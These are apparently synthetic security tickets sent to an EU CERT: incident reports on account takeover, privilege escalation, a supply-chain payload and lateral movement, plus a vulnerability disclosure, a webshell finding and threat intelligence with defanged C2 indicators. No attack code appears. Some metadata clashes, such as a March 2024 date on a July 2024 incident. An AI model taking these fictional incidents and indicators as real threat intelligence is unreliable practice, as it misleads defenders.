This issue was first flagged by our internal SIEM (LogPoint) on 03/07/2024 at 09:42 CET, following several anomalous SQL queries executed from the Dynamics application layer against sensitive financial reporting tables.\n\nSpecifically, our logs ([postgresql.log] and [dyn365-app.log]) show repeated attempts to extract larger-than-usual data sets from the 'ledger_entries' and 'payroll_audit' tables. These queries originated from a service account ('svc_d365sync') that, per policy, should only have read access to limited reporting views. However, between 09:40 and 09:55 CET, we detected privilege escalation events allowing the account to run direct SELECT * statements and even unauthorized UPDATEs on financial records (see attached log extracts).\n\nSample log excerpt:\n[2024-07-03 09:44:12 CET] [postgresql.log] LOGIN: svc_d365sync from 10.67.5.21 (Dynamics App Server)\n[2024-07-03 09:45:03 CET] [postgresql.log] QUERY: SELECT * FROM payroll_audit;\n[2024-07-03 09:46:15 CET] [postgresql.log] PRIVILEGE ESCALATION: svc_d365sync granted temporary db_admin role\n\nAttempts to restart the Dynamics and PostgreSQL services, as well as review patch status, did not resolve the abnormal behavior.

Our Azure AD B2C setup seems to intermittently block logins from external IPs\u2014last night\u2019s attempt from 185.23.144.81 triggered a conditional access lockout. We\u2019ve whitelisted the /test-pentest/ endpoint, but the login page still throws a 403 error if accessed from outside the EC network.\n\nCan you confirm the source IPs you\u2019ll be using during the engagement window (15\u201319 July)? Our firewall logs show a few hits from 185.23.144.80/29, but not sure if that\u2019s you or a false positive. Also, is there a preferred user role you want assigned to the test accounts (e.g., standard user, admin, or custom)?\n\nLastly, our devs flagged a weird issue: after enabling debug logging for your accounts, the app started logging full JWT tokens in plain text (not ideal). We\u2019ve disabled that for now, but let us know if you need more verbose logs or if you spot anything odd during testing.\n\nApologies for the hassle\u2014just want to make sure everything\u2019s smooth for your side and we\u2019re not blocking any of your test flows.\n\nThanks!\nSophie\n\n-----\n\nLet me know if you need us to set up a quick call or if you want a temporary VPN tunnel.

I wanted to flag a vulnerability I stumbled upon while prepping a course module for my postgraduate students at Vrije Universiteit Brussel (VUB). I was demoing real-world OAuth implementations and, during testing, noticed a potential security issue in the authentication flow of the EU Digital Gateway portal (hxxps://gateway.europa[.]eu). I\u2019m reporting this under your Coordinated Vulnerability Disclosure process and am happy to cooperate on any next steps.\n\nHere\u2019s what I found: When initiating the OAuth2 login process as a third-party application, I observed that the state parameter is not properly validated upon callback. Specifically, by manipulating the state value during the authorization request and then intercepting the callback, I was able to perform a CSRF attack, effectively hijacking user sessions if the victim is authenticated. This could let an attacker link their own session to another user\u2019s account, potentially exposing personal data or allowing unauthorized actions within the portal.\n\nI\u2019ve attached a short write-up and a demo script (Python, with step-by-step comments). The exploit was confirmed on both Firefox and Chrome, but only when the victim is already logged in. No actual user data was accessed\u2014just my own test accounts. For reference, the affected endpoint is /auth/callback, and the state parameter seems to be echoed back without verification.\n\nGiven the sensitivity of the Digital Gateway, I think this should be prioritized. Please let me know your preferred timeline for public disclosure and if you need any additional PoC material. I\u2019m also happy to walk your team through the findings in a virtual session if that\u2019s useful.\n\nThanks for your attention,\n\nDries Van Loock\nLecturer, Department of Computer Science\nVrije Universiteit Brussel", "created_date": "2024-01-21T00:00:00", "email_address": "dries.vanloock@vub.be", "assigned_queue": "OFFSEC::CVD"}

This is a bit out of my usual lane (I\u2019m in admin, not IT), but our SharePoint Online instance has been acting weird since late yesterday (around 17:30 CET, 16 July 2024). Several colleagues in the Regulatory Affairs group started getting notifications about files being moved or deleted that they didn\u2019t touch. At first, we thought it was just some sync issue, but this morning a few more people said they couldn\u2019t find key documents from the Orphan Drugs folder, and the activity log shows mass access from a device that\u2019s not registered to any of our users.\n\nI forwarded this to our IT helpdesk, and they checked the Microsoft 365 audit logs. They noticed a bunch of successful logins to three accounts (regaffairs.maria, regaffairs.lars, and regaffairs.ana) from an IP in Romania (92.83.104.59) between 17:31 and 18:02 CET. None of those staff are traveling or working remotely this week, so that seems fishy. Also, the device name in the logs is just \u201cDESKTOP-4VJQ\u201d (which doesn\u2019t match our naming convention), and the user agent is something like \u201cMozilla/5.0 (Windows NT 6.1; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0\u201d.\n\nWhat\u2019s more worrying is that the logs show a download of about 800MB from the Orphan Drugs folder right after the logins, and then a bunch of deletes. IT says they see some Power Automate flows were triggered too, but we don\u2019t use those for this team\u2019s folders. The accounts in question have MFA enabled, but apparently, there were no new MFA prompts recorded during those sessions (IT is still checking if there\u2019s some kind of session token reuse or cookie theft going on).\n\nIT has now disabled the affected accounts and blocked the suspicious IP at the firewall, but we\u2019re not sure if anything else was accessed or if this is part of something bigger. They asked me to escalate to CERT-EU for further investigation, as they suspect possible data exfiltration and maybe even an insider angle (though there\u2019s no evidence of that yet). I\u2019ve attached the audit logs and the list of affected files (see \u2018ema_sharepoint_incident_20240716.zip\u2019). \n\nCan you please advise on next steps? Should we be alerting other agencies or just keep this internal for now? Sorry if the details are patchy\u2014I\u2019m just trying to help coordinate from our side.

Yesterday afternoon (10 July 2024), our SOC team detected a series of unusual login attempts targeting privileged accounts associated with the analytics dashboard (host: ep-analytics01.europarl.europa.eu).\n\nSpecifically, between 14:22 and 15:05 CET, [auth.log] entries show 17 failed login attempts for user 'analyst_lead' from IP address 185.44.77.112, which geolocates outside the usual operational regions for our staff. Shortly after, a successful login was recorded for the same account, but with a new user agent string (Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36) not previously associated with this user profile. No MFA challenge was triggered, which is inconsistent with our current security policy.\n\nFurther review of the SIEM dashboard (Splunk) indicates that this account initiated several large data export operations (see attached: [splunk_export_events.csv]) immediately following the suspicious login. The exported datasets included sensitive client engagement metrics and investment optimization models. At this stage, we cannot confirm whether these actions were legitimate or part of a data exfiltration attempt.\n\nWe have temporarily disabled the affected account and are in the process of collecting additional forensic artefacts, including session tokens and relevant endpoint logs.

Specifically, a scheduled data ingestion process failed unexpectedly, and subsequent forensic analysis revealed that the associated Python package repository had been modified to include a previously unseen obfuscated payload (SHA256: 9b21a7f...e54b0). The compromise appears to be linked to the upstream vendor\u2019s automated build pipeline, which, according to their disclosure, was briefly accessed by an unauthorised third party. The vendor has since issued a public statement and a new package version, but we have concerns regarding the scope of lateral movement prior to detection.\n\nWe have isolated the affected virtual machines and are conducting a wider review of related assets. Early static analysis of the malicious package indicates attempts to establish outbound connections to hxxps://datapull[.]syncstore[.]eu and hxxps://update[.]py-feed[.]cloud, both of which are newly registered domains (see attached IOC list in CSV format). Our preliminary mapping of the TTPs suggests overlaps with MITRE ATT&CK techniques T1195 (supply chain compromise) and T1071.001 (application layer protocol: web protocols).\n\nWe have attached the following artefacts for your review:\n- CSV export of observed indicators (domains, IPs, hashes)\n- A zipped copy of the malicious Python package (password: EIF2024!)\n- Network logs capturing the initial outbound connections\n\nGiven the cross-border nature of our vendor relationships and the possible impact on other EU institutions using similar software, we would appreciate any threat intelligence you may have on related incidents or observed exploitation attempts elsewhere.

At approx. 13:10 CET today (18 July 2024), our CrowdStrike Falcon EDR triggered several critical alerts for unusual process injection activities on two internal workstations (audit-ws42.lux.intra.ec.europa.eu and audit-ws87.lux.intra.ec.europa.eu). These hosts are both used by our audit staff, but don\u2019t typically communicate with each other or access administrative shares.\n\nHere\u2019s what we know so far:\n- Falcon flagged multiple attempts by process 'rundll32.exe' (PID 4512) to inject into 'explorer.exe' and spawn PowerShell instances, with encoded command lines.\n- Shortly after, lateral SMB traffic from audit-ws42 to audit-ws87 was seen on TCP port 445. We checked the NetFlow logs, which indicate this was not a normal mapped drive usage (see extract below):\n[2024-07-18T13:12:41Z] src: 10.110.23.44 dst: 10.110.23.57 port: 445 bytes: 8416\n- Sysmon on audit-ws87 shows an unexpected scheduled task creation (TaskName: \"Microsoft\\Windows\\UpdateChecker\\Update1\") and a new service (SvcName: \"audsvc1\") registered by user 'svc_audit'. This account should have limited rights, so we\u2019re concerned about privilege escalation.\n- Both machines attempted outbound HTTPS connections to hxxps://data-sync[.]eu-syncbox[.]com at 13:14 CET. Our proxy blocked the domain, but the attempts were repeated from different processes.\n\nWe\u2019ve isolated both endpoints from the network and revoked credentials for 'svc_audit' as a precaution. No obvious data exfiltration in proxy logs yet, but we\u2019re still reviewing firewall events for anomalies. We\u2019re preparing disk images and will upload to the secure CERT-EU share as soon as they\u2019re ready.\n\nThis appears to be an active compromise, possibly leveraging pass-the-hash or similar techniques. We\u2019re stretched thin and request immediate assistance with:\n- Full forensic triage on both endpoints (memory, disk, scheduled tasks, new services, etc.)\n- Network log review for additional lateral movement or command-and-control indicators\n- Recommendations for wider credential resets and containment across the audit staff subnet\n\nApologies for any rushed info, things are moving fast. Please let us know if you need live access or can join a call with our local IR team this afternoon.\n\nThanks in advance for your urgent support.\n\nRegards,\n\n--\nMartin Keller\nIT Security Analyst\nauditors-it@eca.europa.eu\nEuropean Court of Auditors, Luxembourg", "created_date": "2024-03-01T00:00:00", "email_address": "martin.keller@eca.europa.eu", "assigned_queue": "DFIR::incidents"}

During a quarterly penetration test on our public-facing procurement portal (procure.eib.int), I stumbled on a rather concerning issue. In the invoice upload workflow, files submitted via the /upload-documents endpoint are not properly validated for file type or size, and no anti-virus scanning seems to be enforced at the gateway. \n\nAs a test, I managed to upload a PHP webshell disguised with a .jpg extension. The file was stored in an accessible directory (uploads/2024/06/) and could be executed remotely by browsing directly to its URL. I haven\u2019t attempted any destructive actions or privilege escalation, just verified that the shell could echo server variables. This appears to open the door for arbitrary code execution and, potentially, full server compromise if exploited.\n\nI\u2019m flagging this as a serious risk, especially since this portal handles sensitive procurement documents.

As you may know, this group has primarily targeted French government digital services, but in the last week, we've seen increased scanning and spear-phishing activity aimed at several EU agency endpoints (notably those resolving to eu-west-1 AWS IP ranges).\n\nBetween 28 June and 2 July, we identified 14 previously unreported domains\u2014mostly .eu and .pro TLDs\u2014registered via NameSilo and Namecheap, exhibiting identical DNS patterns as those documented in the January \"SilverThread\" campaign. Our sandbox detonation of lures (subject: \"Mandat administratif URGENT.pdf\") revealed outbound beaconing to 185.182.49[.]172:443 and fallback communication over 146.59.28[.]112:8443, both using self-signed Let's Encrypt certificates (see attached pem files for thumbprints). Some of the C2 endpoints were observed serving malicious PowerShell payloads (SHA256: 89af7b12c6c9...b31e) that leverage WMI for persistence and lateral movement (ATT&CK T1047, T1059.001).\n\nWe've also correlated HTTP request headers and custom user-agent strings with previous NebulaSpider activity\u2014specifically, the header \"X-Session-Token: galileo2024\". No confirmed breaches within ANSSI perimeter so far, but one unsuccessful credential harvesting attempt was recorded against a senior staff mailbox (details in attached log extract).\n\nPlease find enclosed:\n- CSV listing 14 new suspected C2 domains with registration and first-seen timestamps\n- Two pem files with C2 TLS certificate thumbprints\n- IOC JSON (nebula-iocs-fr_20240703.json) mapping observed indicators to MITRE techniques\n\nWe recommend EU partners monitor for the listed domains and IPs, block as necessary, and report any matching traffic. It would be helpful if you could:\n1. Check for overlap between these IOCs and any ongoing incidents targeting other EU institutions,\n2. Share further intelligence on NebulaSpider\u2019s current tooling or infrastructure,\n3. Confirm if the \u201cgalileo2024\u201d session token header has appeared in your telemetry.\n\nHappy to provide additional samples or arrange a technical sync if required\u2014please reply to this thread or ping me via our secure Mattermost channel.

The event triggered our anomaly detection threshold but did not immediately activate automated mitigation, as traffic patterns initially mimicked legitimate connections to public streaming services used during the session.
